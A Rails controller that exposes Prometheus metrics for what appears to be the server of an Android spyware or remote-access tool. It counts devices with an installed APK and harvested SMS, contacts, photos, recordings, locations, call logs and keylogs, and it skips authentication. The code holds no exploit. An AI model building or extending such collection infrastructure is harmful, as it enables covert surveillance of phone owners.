# frozen_string_literal: true

# Exposes metrics in Prometheus text format at GET /metrics.
# Includes system metrics (memory, CPU, disk) and business metrics (devices, commands, uploads).
class MetricsController < ApplicationController
  skip_before_action :verify_authenticity_token
  skip_before_action :authenticate_admin_user!, if: -> { respond_to?(:authenticate_admin_user!) }

  def index
    collect_business_metrics
    collect_system_metrics

    render plain: MetricsService.to_prometheus, content_type: 'text/plain; version=0.0.4; charset=utf-8'
  end

  private

  def collect_business_metrics
    MetricsService.set_gauge(:active_devices, active_device_count)
    MetricsService.set_gauge(:total_devices, Smartphone.count)
    MetricsService.set_gauge(:websocket_connections, websocket_connection_count)
    MetricsService.set_gauge(:total_sms, SmsMessage.count)
    MetricsService.set_gauge(:total_contacts, Contact.count)
    MetricsService.set_gauge(:total_pictures, Picture.count)
    MetricsService.set_gauge(:total_recordings, Recording.count)
    MetricsService.set_gauge(:total_locations, GeoLocation.count)
    MetricsService.set_gauge(:total_call_logs, CallLog.count)
    MetricsService.set_gauge(:total_keylogs, keylog_count)
    MetricsService.set_gauge(:error_rate_per_minute, ErrorTracker.error_rate)
    MetricsService.set_gauge(:error_spike, ErrorTracker.spike_detected? ? 1 : 0)
  rescue StandardError => e
    Rails.logger.error("MetricsController: failed to collect business metrics: #{e.message}")
  end

  def collect_system_metrics
    MetricsService.set_gauge(:system_memory_usage_percent, system_memory_percent)
    MetricsService.set_gauge(:system_disk_usage_percent, system_disk_percent)
    MetricsService.set_gauge(:db_pool_size, ActiveRecord::Base.connection_pool.size)
    MetricsService.set_gauge(:db_pool_active, ActiveRecord::Base.connection_pool.connections.size)
  rescue StandardError => e
    Rails.logger.error("MetricsController: failed to collect system metrics: #{e.message}")
  end

  def active_device_count
    Smartphone.joins(:apk_installation)
              .where('apk_installations.status = ?', 'installed')
              .where('smartphones.updated_at > ?', 5.minutes.ago)
              .count
  rescue StandardError
    0
  end

  def websocket_connection_count
    ActionCable.server.connections.size
  rescue StandardError
    0
  end

  def keylog_count
    Keylog.count
  rescue StandardError
    0
  end

  def system_memory_percent
    if Gem.win_platform?
      mem_info = IO.popen(['wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory', '/Value'], &:read).to_s.split("\n")
      total = mem_info.find { |l| l.include?('TotalVisibleMemorySize') }&.split('=')&.last&.to_i || 0
      free = mem_info.find { |l| l.include?('FreePhysicalMemory') }&.split('=')&.last&.to_i || 0
      total > 0 ? (((total - free).to_f / total) * 100).round : 0
    else
      output = IO.popen(['free', '-m'], &:read).to_s
      mem_line = output.split("\n").find { |l| l.include?('Mem') }
      parts = mem_line&.split || []
      total = parts[1].to_i
      used = parts[2].to_i
      total > 0 ? ((used.to_f / total) * 100).round : 0
    end
  rescue StandardError
    0
  end

  def system_disk_percent
    if Gem.win_platform?
      output = IO.popen(['wmic', 'logicaldisk', 'get', 'size,freespace,caption'], &:read).to_s
      line = output.split("\n").find { |l| l.include?('C:') }
      usage = line ? line.split : []
      total = usage[1].to_i
      free = usage[2].to_i
      total > 0 ? (((total - free).to_f / total) * 100).round : 0
    else
      output = IO.popen(['df', '-h', '/'], &:read).to_s
      output.split("\n").last&.split&.at(4)&.to_i || 0
    end
  rescue StandardError
    0
  end
end
